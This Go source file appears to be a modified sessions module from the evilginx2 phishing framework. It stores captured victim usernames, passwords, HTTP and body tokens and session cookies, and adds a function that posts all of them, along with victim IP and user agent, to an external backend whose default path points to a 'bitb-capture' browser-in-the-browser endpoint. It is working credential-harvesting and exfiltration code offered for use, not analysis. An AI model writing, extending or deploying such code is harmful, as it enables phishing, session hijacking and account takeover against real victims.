package database

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/kgretzky/evilginx2/log"
	"github.com/tidwall/buntdb"
)

const SessionTable = "sessions"

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	_, err := d.sessionsGetBySid(sid)
	if err == nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
	}

	jf, _ := json.Marshal(s)

	err = d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}
	//log.Info("SESSION CREATED: %s", s)
	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.BodyTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.HttpTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.CookieTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	return err
}
// switch back
/* func (d *Database) sessionsUpdate(id int, s *Session) error {
    jf, err := json.Marshal(s)
    if err != nil {
        log.Error("sessionsUpdate: failed to marshal session: %v", err)
        return err
    }

    // Option 1: Using Evilginx's log.Info
    log.Info("sessionsUpdate: saving session %d to DB (JSON length: %d)", id, len(jf))
    // If you want to see part of the JSON too:
    log.Info("sessionsUpdate: session JSON (truncated): %.200s...", string(jf))

    // Option 2: Using fmt.Printf (standard Go)
    fmt.Printf("sessionsUpdate: DB save for session ID=%d\n", id)
    fmt.Printf("sessionsUpdate: JSON length=%d bytes\n", len(jf))
    // Print full JSON (be careful in production — long output)
    //fmt.Printf("sessionsUpdate: full JSON:\n%s\n", string(jf))

    err = d.db.Update(func(tx *buntdb.Tx) error {
        key := d.genIndex(SessionTable, id)
        log.Debug("sessionsUpdate: storing session under key: %s", key)
        tx.Set(key, string(jf), nil)
        return nil
    })

    if err != nil {
        log.Error("sessionsUpdate: failed to update DB: %v", err)
        fmt.Printf("sessionsUpdate: ERROR: failed to update DB: %v\n", err)
        return err
    }

    log.Info("sessionsUpdate: session %d successfully saved to DB", id)
    fmt.Printf("sessionsUpdate: session %d successfully saved to DB\n", id)

    return nil
}
 */
func (d *Database) sessionsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
	return err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}


func (d *Database) postSessionToBackend(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		log.Error("postSessionToBackend: sessionsGetBySid error for sid=%s", sid, err)
		return err
	}

	backendURL := os.Getenv("BACKEND_URL")

	if backendURL == "" {
		backendURL = "http://localhost:3500/api/bookings/bitb-capture"
	}
	log.Warning("postSessionToBackend: url=%s sid=%s user=%s", backendURL, s.Id, s.Username)
	
	secret := []byte(os.Getenv("ENCRYPTION_SECRET"))
	if len(secret) == 0 {
		err := fmt.Errorf("postSessionToBackend: ENCRYPTION_SECRET is empty, refusing to send unencrypted request")
		log.Error("postSessionToBackend: %v", err)
		return err // <-- this stops the process for this session
	}

	 payload := map[string]interface{}{
        "id":          s.Id,
        "name":        s.Phishlet,
        "username":    s.Username,
        "password":    s.Password,
        "landing url": s.LandingURL,
        "custom":      s.Custom,
        //"params":      s.Params,
        "body":        s.BodyTokens,
        "headers":     s.HttpTokens,
        "cookies":     s.CookieTokens,
        "remote_ip":   s.RemoteAddr,
        "ua":          s.UserAgent,
        //"is_auth":     s.IsAuthUrl,
    }

	body, err := json.Marshal(payload)
    if err != nil {
        log.Error("postSessionToBackend: json marshal error: %v", err)
        return err
    }
    log.Warning("postSessionToBackend: payload size=%d bytes", len(body))

	mac := hmac.New(sha256.New, secret)
	mac.Write(body)
	sig := mac.Sum(nil)
	sigHex := hex.EncodeToString(sig)

	req, err := http.NewRequest("POST", backendURL, bytes.NewReader(body))
	if err != nil {
		log.Error("postSessionToBackend: new request error: %v", err)
		return err
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Signature", sigHex)

	client := &http.Client{Timeout: 15 * time.Second}
	log.Info("postSessionToBackend sig=%s sending to %s", sigHex, backendURL)

	resp, err := client.Do(req)
	if err != nil {
		log.Error("postSessionToBackend: http error: %v", err)
		return err
	}

	defer resp.Body.Close()

	log.Info("postSessionToBackend: status %s", resp.Status)


	return nil
}
